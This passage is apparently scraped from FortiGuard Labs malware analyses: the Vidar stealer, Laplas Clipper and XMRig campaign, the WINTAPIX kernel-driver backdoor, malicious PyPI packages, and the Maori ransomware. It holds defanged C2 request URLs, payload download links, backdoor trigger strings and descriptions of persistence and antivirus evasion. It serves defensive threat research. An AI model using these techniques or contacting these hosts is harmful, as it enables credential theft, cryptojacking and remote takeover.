absence of User-Agent and other typical HTTP headers in this GET request. The semicolon delimited configuration can be interpreted as follows: Based on this configuration, this stealer will collect passwords stored locally (e.g., FTP, SSH), browser cookies and history, Telegram data, and screenshots. Cryptocurrency wallet collection is not enabled. Once the sensitive information has been collected and compressed into a ZIP file, the malware will exfiltrate this data to the C2 via an HTTP POST request (Figure 7). The POST request contains“id”,which represents the stealer and is the same for every infected user, and a “token” previously provided by the C2 server in the check-in request. The“file”contains a Base64-encoded ZIP file with the data collected by the malware. Figure 8 shows the contents of the ZIP file. Information.txt includes information on the OS, hardware, running processes, and installed software on the infected system (Figure 9). The C2 server then responds with a list of secondary payloads for the malware to download and execute (Figure 10). This sample downloads files stored as releases in GitHub repositories owned by the userjesus061031r. Similar malicious files with different filenames are scattered among other repositories owned by the same user. These files are written to%ProgramData%with randomized filenames containing 20 numeric characters and are executed sequentially. Once the payloads are executed, the malware exits and deletes itself. Analyses of the payloads are discussed in the following sections. This sample was identified as Vidar Stealer based on the C2 protocol, the system data format ininformation.txt,and the organization of the files in the exfiltrated ZIP. While Vidar is a distinctly different malware family from RecordBreaker observed by other researchers tracking the same campaign, both are infostealers, which indicates the threat actor’s primary interest in stealing credentials to further their malicious objectives. GUI_MODERNISTA.exe (SHA256:62d4caf908b3645281d5f3c0f5b5dc3a4beb410015196f7eaf66ca743f415668) is a relatively small (48KB) .NET application that redirects users to hardcoded URL links to files on file-sharing sites containing the purportedly cracked (and illegal) versions of software, as advertised by the YouTube video. This is the only component displayed to the victim, as the other components of the attack chain run covertly in the background. During our research, we also collected a Python version (SHA256:ba9503b78bc62d4e5e22e4f8e04b28bb6179e146e1c0a6ba14dd06608facb481) of this application. The UI of both versions is shown in Figure 11. Vadwax.exe(SHA256:f91d9de259052595946250a1440a2457dbda9ee8aec8add24419ff939f13e003) is 1.17 GB in size but comprised mainly of an overlay of the repeating bytes 0x30, which corresponds to “0” in ASCII (Figure 12). After removing the unused overlay, we ended up with a much smaller 5.87 MB file (SHA256:2fcb61da34b259b9b130c0c75525697931b9dff8e7f9b2198f9db21b5193eeba). Like the earlier sample, this artificial inflation is used to circumvent AV solutions. This sample is Laplas Clipper, which attempts to substitute wallet addresses in the user’s clipboard to steal cryptocurrency. It constantly checks the content of the Windows clipboard against regular expressions retrieved from the C2 server. Upon a match, the content of the clipboard is sent to the C2 server, which responds with the threat actor’s wallet address for the appropriate cryptocurrency for replacement. This enables Laplas Clipper to switch the original payee’s wallet address with the threat actor’s and divert the funds to the threat actor instead. This particular sample is protected by the commercial VMProtect packer with heavy use of anti-sandbox and anti-analysis checks. As Laplas Clipper has been described by other researchers, we will just focus on the persistence and C2 communication of this sample. Persistence: This sample checks to see if it is being run from the%Appdata%directory. If not, it copies itself at%Appdata%\\telemetry\\svcservice.exeand appends an overlay containing randomized bytes to the file. It then maintains persistence by adding a registry value namedtelemetryto the following key: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Communication: Laplas Clipper first registers with the C2 server using the current machine name and Windows username (guidparameter) and a 64-character hexadecimal string (keyparameter) via an HTTP GET request tohxxp://85[.]192[.]40[.]252/bot/online?guid=<machine name>/<username>&key=<hexadecimal string> After successfully registering with the C2 server, it requests regular expressions fromhxxp://85[.]192[.]40[.]252/bot/regex(Figure 13). The regular expressions hunt for the addresses of the following cryptocurrencies in the clipboard (ordered alphabetically): Incidentally, the Laplas Clipper C2 panel at laplas[.]app resolves to 85[.]192[.]40[.]252 (Figure 14). Vaxa.exe (SHA256:44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f) is an in-memory loader for an embedded miner downloader payload. It is a 32-bit Windows console application masquerading as a program for performing and displaying the results of some simple math operations (Figure 15). It then proceeds to decrypt the shellcode and payload from its body. The shellcode is provided with the path of the application to inject the payload into before execution is redirected to it (Figure 16). The shellcode uses process hollowing to inject and execute a .NET assembly namedTask32Main(SHA256:5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3) within Regsvcs.exe. Task32Main – Miner Downloader Task32Mainis a .NET downloader and installer for Monero cryptomining components. It provides supporting functionality, such as maintaining persistence and AV evasion. More importantly, it is responsible for installing the watchdog component, which ensures that the miner is kept running in the victim system. To avoid being detected, it executes encoded PowerShell commands to add the following to the directories on the Windows Defender's scanning exclusion list: It then downloads a configuration file fromhxxps://pastebin[.]com/raw/5p5KkdBwto download other malware payloads and their execution parameters (Figure 17). A modified copy of this configuration is written aslog.uceto the following directories: This will be used as the configuration file for the watchdog component discussed in the next section. The above configuration instructs the malware to download additional cryptomining-related payloads from the following URLs: The malware creates the directory%ProgramData%\\Dllhostand saves the downloaded files asdllhost.exe(miner watchdog) andwinlogson.exe(Monero XMRig miner), respectively. The malware then modifies the directory’s permissions to deny access to the current user. To persist in the victim system, it then adds several scheduled tasks to execute the watchdogdllhost.exeevery hour. It does this by executing the following command: The scheduled task names impersonate legitimate Windows-related software to deter casual detection and are as follows: It also changes the power settings of the system to prevent it from hibernating and sleeping by executing the following command to ensure that its Monero cryptominer component (executed later) is always running while the machine is powered up: The host file is also modified to resolve security product-related domains to the IP 0.0.0.0 to disable communication by security products, e.g., for downloading updates. Lastly, it executes the watchdog component%ProgramData%\\dllhost.exe, which executes the actual cryptominer. Dllhost.exe - Miner watchdog Dllhost.exe(SHA256:d2e371810e8c7b1e039a02a578b1af0c6250665e85206b97a1ecb71aa5568443) is a .NET assembly namedTask32Watch. It is a watchdog application that executes the miner component, monitors its process, and ensures it is kept running and uses the latest mining parameters. It reads its own configuration file,log.uce, previously dropped by the installer componentTask32Main.It has the same content as the configuration file downloaded by theTask32Maincomponent, excluding the first three lines. Moreover, it includes the Pastebin URL where the configuration file was downloaded as the last line. This Pastebin URL allows the watchdog to retrieve the latest XMRig mining parameters (e.g., mining pool server, wallet address, worker name “snnssnewte”, etc.). It then executes the miner winlogson.exe located in the same directory with these mining parameters. As a watchdog, it ensures that the miner process is always running by constantly enumerating the processes currently running in the system and then re-running the miner if it is terminated. In addition, to lessen the chance of getting discovered and being terminated by the user, it kills processes related to system diagnostics and analysis tools, such as Task Manager and Process Hacker. Lastly, it also ends games-related processes, which are usually resource-intensive and reduce the CPU resources available for mining. This campaign highlights the dangers of downloading illegally pirated copies of software because of the tendency of threat actors to prey on such users to steal credentials, sensitive data, or even cryptocurrency. On top of this, the infected machine is also used for cryptojacking to mine Monero for the threat actor. The agility of these threat actors is also a cause for concern, as we observed the threat actor behind this campaign rapidly uploading new copies of similar malware whenever GitHub takes down the malicious repositories. FortiGuard Labs will continue to monitor and report on updates to this threat campaign. Fortinet customers are already protected from this malware through FortiGuard’s Web Filtering, AntiVirus, FortiMail, FortiClient, and FortiEDR services, as follows: The following (AV) signature detects the malware samples mentioned in this blog: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. FortiGuard Labs provides IPS signatures to detect malware traffic. The FortiGuard Web Filtering Service blocks the C2 servers and download URLs. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceproactively blocks these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources., MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contactourGlobal FortiGuard Incident Response Team. Files 820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c e256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb 62d4caf908b3645281d5f3c0f5b5dc3a4beb410015196f7eaf66ca743f415668 44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f f91d9de259052595946250a1440a2457dbda9ee8aec8add24419ff939f13e003 2fcb61da34b259b9b130c0c75525697931b9dff8e7f9b2198f9db21b5193eeba d2e371810e8c7b1e039a02a578b1af0c6250665e85206b97a1ecb71aa5568443 21bc43587dc1f19ec6271e69fe709b18fdefdfbfc5971a3edf00e92cb1b77995 a0ac98bbd611fc697133ab872f9d978dc1931ea70f8a2374d18aff5754f7c110 ba9503b78bc62d4e5e22e4f8e04b28bb6179e146e1c0a6ba14dd06608facb481 9c5aff1352619f14feb736916374bbed06ef41a7d0cb72d789cb86e8f3906212 5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3 Download URLs hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/2O23-F1LES-S0ft.rar hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vadwax.exe hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/GUI_MODERNISTA.exe hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/exep.exe hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vaxa.exe hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vdsc.exe hxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vdscs.exe hxxps://github[.]com/dwadaxwad/dvsv/releases/download/sdv/xmrig.exe hxxps://github[.]com/dwadaxwad/dvsv/releases/download/sdv/WatchNew.exe hxxps://github[.]com/dwadaxwad/dvsv/releases/download/sdv/lolMiner.exe hxxps://github[.]com/bonniebosidaw/bolikgs/releases/download/voollik/2O23-F1LES-S0ft.rar hxxps://pastebin[.]com/raw/5p5KkdBw C2s 79.137.206[.]228 (Vidar C2) 85.192.40[.]252 (Laplas Clipper C2) Monero Wallet Address 48GSRPwCNzLCkNGCMgUsqfg8BxJq8azyUbMLQM4Dvqh64M8goBjQ2SkVFUokVDzQpqfotv1oDcB8X8qMxuLK6GDBSWU3tp4 youtube,cryptojacking FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/youtube-pirated-software-videos-deliver-triple-threat-vidar-stealer-laplas-clipper-xmrig-miner"
  },
  {
    "title": "WINTAPIX: A New Kernel Driver Targeting Countries in The Middle East",
    "content": "FortiGuard Labs Threat Research Affected platforms:WindowsImpacted parties:Windows UsersImpact:Allows remote code execution and persistent access to the host (backdoor) and the rest of the network (proxy)Severity level:Medium At Fortinet, we monitor suspicious executables that make use of open-source tools and frameworks. One of the things that we keep an eye out for is tools that use theDonutproject. Donut is a position-independent shellcode that loads .NET Assemblies, PE files, and other Windows payloads from memory and runs them with parameters. During our daily threat-hunting process in early February, we encountered a kernel driver that used the Donut tool and caught our attention for further analysis. The sample that triggered our rule was a driver called WinTapix.sys (which is why we named it WINTAPIX). Since it uses Donut, we decided to analyze it further. It turned out to be a very interesting sample that we believe is being used in targeted attacks against countries in the Middle East. This captured sample was compiled in May 2020 but was only uploaded to Virus Total in February of this year. Pivoting from this sample, we found another variant of this driver with the same name that was compiled around the same time, but it was uploaded to Virus Total in September 2022. Pivoting again from the used certificates, we found another variant of the WINTAPIX driver with the SRVNET2.SYS name. This sample was compiled in June 2021 and was first observed in the wild in December 2021. Based on the information we have collected so far, we now believe that this driver has been active in the wild since at least mid-2020 and, to the best of our knowledge, has not been reported before. Observed telemetry shows that 65% of the lookups for this driver were from Saudi Arabia, indicating it was a primary target. This same telemetry shows a considerable increase in the number of lookups for this driver in August and September 2022 and again in February and March 2023. This may indicate that the actor(s) behind this driver was operating major campaigns on these dates. However, we still do not have enough information about how this driver has been distributed and who was behind these operations. Based on the victimology, we suspect an Iranian threat actor developed this driver. Observed telemetry shows that while this driver has primarily targeted Saudi Arabia, it has also been detected in Jordan, Qatar, and the United Arab Emirates, which are the classic targets of Iranian threat actors. Since Iranian threat actors are known to exploit Exchange servers to deploy additional malware, it is also possible that this driver has been employed alongside Exchange attacks. To that point, the compilation time of the drivers is also aligned with times when Iranian threat actors were exploiting Exchange server vulnerabilities. The attribution process of this driver is still ongoing, and we will provide additional info when we have a better idea about the identity of the threat actor or group. In this blog post, we provide a comprehensive analysis of this driver. We analyzed the sample with the SHA-256 hash of 8578bff36e3b02cc71495b647db88c67c3c5ca710b5a2bd539148550595d0330, also known as Wintapix.sys. As the file extension suggests, this is a Windows Kernel Driver. Figure 1 shows some of its attributes. Its digital signature is invalid, meaning the threat actor might first need to load a vulnerable (but legitimate) driver and exploit that to load the Wintapix.sys. But once the driver is loaded, the following execution chain runs: We will look at these artifacts in more detail in the rest of the analysis. Wintapix.sys is partially protected by VMProtect, a software protection tool that uses virtualization to protect software applications from reverse engineering and unauthorized usage. It transforms the original executable file into a virtualized code executed in a protected environment, making it difficult to analyze and tamper with. However, not all functions in the driver are protected, including the code that creates the next stage of the attack, which is the focus of the analysis. Wintapix.sys is essentially a loader. Thus, its primary purpose is to produce and execute the next stage of the attack. This is done using a shellcode. Interestingly, the shellcode (Figure 3) is hardcoded in the binary without any obfuscation. This defeats the purpose of protecting most of the binary with VMProtect since most Anti-Virus engines can identify the embedded shellcode. To inject the shellcode, the driver must first find a suitable target process. The requirements for the target process are as follows: Once a suitable process is found, it is opened with ZwOpenProcess(), and memory is allocated in the target process’s memory with ZwAllocateVirtualMemory(). Finally, NtWriteVirtualMemory() injects the embedded shellcode into the target process (Figure 5). The address of NtWriteVirtualMemory() is recovered in runtime, helping to hide the function call from static analyzers. Another important function of Wintapix.sys is to set up persistence. This is first done by creating register keys at the following places: Interestingly, the driver is set to load in Safe Boot. Safe Boot, also known as Safe Mode, is a diagnostic startup mode in Windows that launches the system with minimal drivers and services. It is designed to help users troubleshoot and resolve software or driver-related issues that might prevent the system from starting normally. Loading the driver in Safe Boot also adds another layer of persistence to the mix. All created registry keys are monitored using the ZwNotifyChangeKey(). This Windows kernel-mode function allows monitoring changes to a specified registry key. The function notifies the caller of any changes to the registry key by signaling the event or invoking the APC (asynchronous procedure call) routine. This makes it useful for applications that need to react to registry modifications in real time. This allows the malware to reset itself in the registry after it has been removed. It also starts a new thread with PsCreateSystemThread() to monitor the file location of Wintapix.sys. It uses NtNotifyChangeDirectoryFile() to monitor changes in the file. Should Wintapix.sys be deleted, it will write it back to the same location. Fortunately, the embedded shellcode can be dumped from Wintapix.sys and analyzed separately. It quickly revealed that the shellcode was created using the Donut project. Donut allows you to convert any .NET assembly or shellcode file into position-independent shellcode, which can then be injected into a target process using techniques like process hollowing or thread hijacking. The generated shellcode is self-contained and does not rely on any external dependencies. This means that the primary goal in our analysis should be to extract the next attack stage, which should be a .NET assembly. The .NET payload can be extracted from the Donut shellcode by identifying and breaking the decryption function in a debugger. After decryption runs, the .NET assembly can be dumped from memory. Once the payload is saved into a file, we analyzed it as a stand-alone .NET executable. Of course, one of the advantages of .NET binaries (from a reverse engineering point of view) is that they can be easily decompiled into source code. This, of course, is a tremendous help in understanding the binary’s goals and capabilities. Detect It Easy (Figure 8), however, tells us that this executable has been protected by multiple obfuscators, particularly Smart Assembly and Eazfuscator. Because of this, the deobfuscator tools did not help much, and we just had to live with the challenge. The program's main function first decodes two arrays using the GetListUrls() function (Figure 9), suggesting that the results contain URLs. The array called ‘input’ contains the following decoded values: \"accidents_\" \"js-\" \"aspnet_client_\" \"js_search-\" \"_book\" \"library-\" \"subject_\" \"lookup_data-\" \"_toj_web\" \"mng_data_bank_\" \"transactions-\" \"_models\" \"trn_fitness-\" \"news_\" \"update-\" \"_omrvision\" \"user_accounts-\" \"popup_\" \"violation-\" \"_program_steps\" \"workflow-\" The array called ‘input2’ contains the following values: \"programs_skill_\" \"competences-\" \"properties_\" \"-content\" \"_report\" \"evaluation-\" \"expert_data_\" \"css-\" \"_expert_form\" \"img-\" \"-field\" \"educat_\" \"reports-\" \"_employee\" \"-scales\" \"files_\" \"scripts-\" \"_fonts\" \"-skill\" \"helpes_\" These values are used to construct URLs. However, the malware is looking for Microsoft Internet Information Services (IIS) characteristics to build them. This means that this malware only targets IIS servers. On machines without IIS installed, it will simply crash. Given the IIS characteristics shown in Figure 10, the malware extracts the sites hosted by the IIS server. And using that and the strings listed above, it constructs a list of URL templates that it will listen on. These URL lists are used in the two main functionalities of the payload: The list named ‘input2’ is used for the backdoor functionality. It starts an HTTP listener on these URLs and uses the Program.HandleRequest() function to handle any incoming requests, which then refers to RequestHandler.Execute()(Figure 11). Let’s start from the end. If the incoming request contains the string ‘wOxhuoSBgpGcnLQZxipa’, then the string ‘UsEPTIkCRUwarKZfRnyjcG13DFA’ is sent back. This seems to be a kind of heartbeat implementation. If the request has a ‘Jet’ or ‘<space>Ver’ parameter, their values are base64-decoded and used to build a command using cmd /c <command>. This is then passed to the RunCommand() function, which executes them with Process.start(). Their output will be sent back in the response to the request. And finally, if the request has a body, then the RunData() function (Figure 12) is called. RunData() decrypts the body of the request and, depending on the message type, implements the following actions: Encryption is implemented for both incoming and outgoing messages. The attribute PrivateKey (Figure 13) suggests that it implements some kind of asymmetric encryption algorithm. However, after looking further into the code, we discovered that calling it a ‘PrivateKey’ is just an exaggeration. In reality, there is nothing asymmetric about it, the program implements a simple XOR encoding (Figure 14) as decryption and encryption using the ‘PrivateKey’ as a key. The values from the list ‘input’ are used to start proxy listeners with Proxy.HandleRequest() on those URLs. This part of the program can handle a variety of data streams. If it’s just data, it will act as a simple proxy, sending and receiving data between the two sides of the proxy. However, it can also accept RDP configuration data (Figure 15). Using this RDP data, it can open a connection to the target RPD server and proxy it to the threat actor. This blog provided a detailed analysis of a driver named WinTapix, which we identified in early Feb of this year. The driver uses a Donut open-source payload to inject its shell code. It seems to be primarily targeting Saudi Arabia. The attribution process of this driver is still ongoing, but based on the victims, we assess with low confidence that this is a work of an Iranian threat actor. Fortinet customers are already protected from these APT and cyber-crime campaigns through FortiGuard’s AntiVirus, FortiMail, and FortiClient services, as follows: The following (AV) signatures detect the malicious documents mentioned in this blog: W32/PossibleThreatW64/AI.Native.Suspicious.AVENW32/GenCBL.BAK!tr FortiEDR natively detects and blocks the malicious executables identified in the report based on their behavior. The following image shows how FortiEDR detects the suspicious driver load and flags the driver as malicious. If you think this or any other cybersecurity threat has impacted your organization, contact ourGlobal FortiGuard Incident Response Team. Filename Sha256 SRVNET2.SYS f6c316e2385f2694d47e936b0ac4bc9b55e279d530dd5e805f0d963cb47c3c0d WinTapix.sys 1485c0ed3e875cbdfc6786a5bd26d18ea9d31727deb8df290a1c00c780419a4e WinTapix.sys 8578bff36e3b02cc71495b647db88c67c3c5ca710b5a2bd539148550595d0330 Injected Shellcode aae9c8bd9db4e0d48e35d9ab3b1a8c7933284dcbeb344809fed18349a9ec7407 .Net payload 27a6c3f5c50c8813ca34ab3b0791c08817c803877665774954890884842973ed The following MITRE ATT&CK overlay contains TTPs associated with the deployment, installation and execution of the WinTapix driver and assocaited backdoor identified by FortiGuard Labs. In this section we are releasing the attack flow of Wintapix driver. The attack flow shows the actions that have been executed by this Driver based on Mitre TTPs. Attack Flowis a language that explains how threat actors combine and sequence various techniques and toolsets to accomplish their objectives.  This language can help defenders to move from tracking individual adversary behaviors to monitoring the series of actions that adversaries utilize to achieve their objectives. kernel FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/wintapix-kernal-driver-middle-east-countries"
  },
  {
    "title": "More Supply Chain Attacks via Malicious Python Packages",
    "content": "FortiGuard Labs Threat Research The FortiGuard Labs team discovered over 30 new zero-day attacks in PyPI packages (Python Package Index). These were found between late March and late April by monitoring an open-source ecosystem. In this blog, we will cover all the packages that were found, grouping them into similar attacks or behavior. Some of these sets may have been shown in aprevious blog. 1.     The packages in the following set were found to be similar: As explained in our last blog, the setup.py file in these packages tries to execute a Python script written to connect to a URL that may contain malicious code. 2.     The next set of packages includes: The setup.py file in these packages tries to steal information, such as credit cards, wallets, account logins, etc. using a Discord webhook. 3.     This set includes the following package: The setup.py file in this package tries to download a zip file to a directory (depending on the Python version), extract its contents, run a script contained in the zip file, and then remove its directory. 4.     This set includes the following package: The setup.py file in this package connects to a URL to download and run a potentially malicious script. 5.     This set includes the following package: Its setup.py file tries to execute the encoded data shown in Figure 5. The decoded data (shown below) tries to connect to a URL to write potentially malicious data to a Python script, which it then runs. It then removes the script. 6.     The packages in this set include: Similar to set two, these packages tr yto steal sensitive information such as wallets, login information, cookies, etc., using a webhook. Its code includes a GitHub link tohttps://github.com/Inplex-sys/BlackCap-Grabber-NoDualHook, indicating that it may be a BlackCap webhook stealer. It also includes additional features, such as bypassing VM machines, hiding itself, and injection techniques, etc. This time, the malicious code is found in __init__.py 7.     Package seven includes: When examining its setup.py, we found that it tries to run the encoded data shown below. Once decoded, we see that it creates and runs an executable file that accesses and exfiltrates sensitive data. 8.     This set includes the following package: This package’s setup.py file reveals the execution of encoded data, as shown in Figure 11. Once decoded (Figure 12), we see that it tries to retrieve potentially malicious data—most likely an executable from a URL—to write to a file, which it then tries to run. 9.     This set includes the following package: This package contains multiple layers of obfuscation in its setup.py file, as shown in Figure 12. While it could not fully run, it still dropped a script named ‘WindowsDefender.py,’ which provides clues that it will execute a potentially malicious script that it retrieved from a file-sharing website, as shown in Figure 13. As this blog shows, we are seeing more—and more different—types of malicious Python packages being loaded into an open-source ecosystem, each with a unique method of attack. Given the increasing number and variety of attacks, end users should keep an eye out for suspicious packages and take caution before using them. We will continue to report current information on malicious packages to help users avoid becoming a victim of a supply chain attack. Fortiguard AntiVirus detects the malicious files identified in this report as tls-bypass-1.0 setup.py:Python/Agent.QD!tr zproxy-1.0 setup.py:Python/Agent.QD!tr ailzyn1tr0-1.0 setup.py:Python/Agent.QD!tr stripe-client-1.0 setup.py:Python/Agent.QD!tr stripepy-1.0 setup.py:Python/Agent.QD!tr proxycpz-1.0 setup.py: Python/Agent.QD!tr pycolorstrex-1.0 setup.py:Python/Agent.QD!tr pyproxyx-1.0 setup.py:Python/Agent.QD!tr colored-fidget-1.0 setup.py:Python/Agent.QD!tr async-box-1.4.7 setup.py:Python/Agent.QD!tr seleniumunclickable-1.0.1 setup.py:Python/Agent.QD!tr pyobfexecute-1.0.0 setup.py:Python/Agent.QD!tr pyobfexecute-1.0.1 setup.py:Python/Agent.QD!tr pyobfexecute-1.0.2 setup.py:Python/Agent.QD!tr pyobfexecute-1.0.3 setup.py:Python/Agent.QD!tr pyobfexecute-1.0.4 setup.py:Python/Agent.QD!tr pyobfexecute-1.0.5 setup.py:Python/Agent.QD!tr compilecls-1.0.2 __init__.py:Python/Agent.QD!tr compilecls-1.0.3 __init__.py:Python/Agent.QD!tr randgenlib-1.0.2 __init__.py:Python/Agent.QD!tr aietelegram-0.3 setup.py:Python/Agent.QD!tr pipcoloringlibary-1.0.0 __init__.py:Python/Agent.QD!tr social-scrapper-3.6 setup.py:Python/Agent.QD!tr quick-telegram-sender-0.7 setup.py:Python/Agent.QD!tr oauth20-api-1.0 setup.py:Python/Agent.KAF libidreq-0.1 setup.py:Python/Agent.QD!tr roblopython-2.0.15 setup.py:Python/Agent.QD!tr setnetwork-0.3 setup.py:Python/Agent.QD!tr pycalculate-1.0.0 setup.py:Python/Agent.QD!tr pipcoloringliberyV2-1.0.0 __init__.py:Python/Agent.QD!tr pythoncolourlibraryV1-1.0.0 __init__.py:Python/Agent.QD!tr tg-bulk-sender-2.3 setup.py:Python/Agent.QD!tr social-scrappers-2.3 setup.py:Python/Agent.QD!tr tiktok-phone-cheker-2.42 setup.py:Python/Agent.QD!tr bogdi-1.0 setup.py:Python/Agent.KAF cloud-client-1.34 setup.py:Python/Agent.QD!tr cloudfix-0.0.0 setup.py:Python/Agent.QD!tr cloudfix-2 setup.py:Python/Agent.QD!tr The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Customers running current AntiVirus updates are protected. The FortiGuard Web Filtering Service detects the download URLs cited in this report as Malicious and blocks them. If you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. tls-bypass-1.0 setup.py ffb2b2e714229f281add91aca0d57dcf zproxy-1.0 setup.py d4c635f97b6564b904803fc2aabbaed8 ailzyn1tr0-1.0 setup.py 89db7b4665cff163931777f091f3b8f5 stripe-client-1.0 setup.py 9b4d4447926c285f0b61cda94cd4c091 stripepy-1.0 setup.py 3330f0addf70da913f2612a1f4160966 proxycpz-1.0 setup.py 2377e6a74e114629130519fb11307c1e pycolorstrex-1.0 setup.py b916f12792f9fa268151a62fd251f5ba pyproxyx-1.0 setup.py 67bd8ac1e0dbfc1e97dcf3484dc94962 colored-fidget-1.0 setup.py 8185f8b26899dc1a3fb21f28a707d416 async-box-1.4.7 setup.py 6bf677c885d35e60469a03a5fbdf9d05 seleniumunclickable-1.0.1 setup.py ef8c25e9f2898b3e4d6ae90c8f3326bb pyobfexecute-1.0.0 setup.py 0c7ef9ff1aa6063b2c05d7b6a90ac9e8 pyobfexecute-1.0.1 setup.py 3ba67a5955c66e272ce9c0dc7899a303 pyobfexecute-1.0.2 setup.py 3a52b545ec52c2690b3b3360e6aeabea pyobfexecute-1.0.3 setup.py f7c4e2d0af6729d90490bed9ec5529bb pyobfexecute-1.0.4 setup.py fb61ab7fedb684c5cc911f34e7694b97 pyobfexecute-1.0.5 setup.py 0e254a2fe5f2b45e8d46473e1bf4261e compilecls-1.0.2 __init__.py f35ceed9535442d8c54ae2c812981967 compilecls-1.0.3 __init__.py 531c8cfcb06f317e3d2d6f5244065d0e randgenlib-1.0.2 __init__.py 72e54b41d47187beed081a19f5f492e9 aietelegram-0.3 setup.py 31fc1f95991734c9b6934aa76ea0937f pipcoloringlibary-1.0.0 __init__.py 53ba97516240b344513be0ebf7bfac12 social-scrapper-3.6 setup.py 51e2facc49ca409cb39388e97231db48 quick-telegram-sender-0.7 setup.py cf247e4436d2d44a4f426447fa125de6 oauth20-api-1.0 setup.py 73e623a5ed9e8f55131c2e00e9660e8b libidreq-0.1 setup.py 31e30f8f40e0f917007a0771b3c671e2 roblopython-2.0.15 setup.py fcc64a48b6182a22952cc237d99d9350 setnetwork-0.3 setup.py 9fa65e48a699f1540c8423844ae0da9f pycalculate-1.0.0 setup.py faf2d569cdaf4e1337d7be27b148e72d pipcoloringliberyV2-1.0.0 __init__.py 53ba97516240b344513be0ebf7bfac12 pythoncolourlibraryV1-1.0.0 __init__.py df46d8d238eee6e283775ba3be6e73bf tg-bulk-sender-2.3 setup.py 047b511c33587734c658146e7802bd01 social-scrappers-2.3 setup.py 0d5a0e3a2ff4d0e216eeac4068a80a79 tiktok-phone-cheker-2.42 setup.py 9e060f032e7b4df22cd0bf3e2402e068 bogdi-1.0 setup.py 84285525a2ab835d5200daedc331242a cloud-client-1.34 setup.py 350639460f29536d7e92e7e9616f5927 cloudfix-0.0.0 setup.py d7296063bbd8eefa39897972530db644 cloudfix-2 setup.py 3d551ad49ad93382a33abe57da0d33c5 Malicious URLs hxxps://paste[.]website/p/400c3e4b-a59b-4598-a199-75e848aeaae3[.]txt hxxps://raw[.]githubusercontent[.]com/KSCHdsc/BlackCap-Inject/main/index[.]js python,zero-day FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "link": "https://www.fortinet.com/blog/threat-research/more-supply-chain-attacks-via-malicious-python-packages"
  },
  {
    "title": "Ransomware Roundup - Maori",
    "content": "FortiGuard Labs Threat Research On a bi-weekly basis, FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This latest edition of the Ransomware Roundup covers the Maori ransomware. Affected platforms:LinuxImpacted parties:Linux UsersImpact:Encrypts files on the compromised machine and demands ransom for file decryptionSeverity level:High Overview FortiGuard Labs recently came across a new ransomware variant called Maori. Like other ransomware variants, it encrypts files on victims’ machines to extort money. Interestingly, this variant is designed to run on Linux architecture and is coded in Go, which is somewhat rare and increases the analysis difficulty. Infection Vector Information on the infection vector used by the Maori ransomware threat actor is not currently available. However, it is not likely to differ significantly from other ransomware groups. At the time of this research, there is no indication that Maori is widespread. Ransomware Execution Maori targets all user files in their home directory (Linux; “/home/<username>”). It ignores files placed elsewhere (including those just in the “/home/” directory as well as in other Linux system directories, like “/”). Due to this narrow objective, it accomplishes its job very quickly. Upon completion, the Maori executable deletes itself from the victim machine. All affected files are appended with a “.maori” extension, and a “README_MAORI.txt” file is dropped into each directory with encrypted files. The entire contents of each affected file are encrypted, rather than just enough of the contents to render them unusable. As a result, files end up slightly larger than the original, as seen in the size differences between Figures 1 and 2. As mentioned, a ransom note is deposited into each directory that has had its files encrypted. The note asks the victim to contact them using Tox (a peer-to-peer, end-to-end encrypted messenger application). It also provides an onionmail e-mail address as a backup communication method and unique strings for both to provide as identification to the Maori operators. No monetary sum is listed as a ransom amount. Fortinet Protections Fortinet customers are already protected from this malware variant through FortiGuard’s Web Filtering, AntiVirus, and FortiEDR services, as follows: FortiGuard Labs detects known Maori ransomware variants with the following AV signatures: The FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. File-based IOCs: SHA256 Malware a5ed581ad5cd1a2f29473cb56116cd179bfe61a924969b2dedbe07660eef9bc5 Maori ransomware FortiGuard Labs Guidance Due to the ease of disruption, damage to daily operations, potential impact to an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. 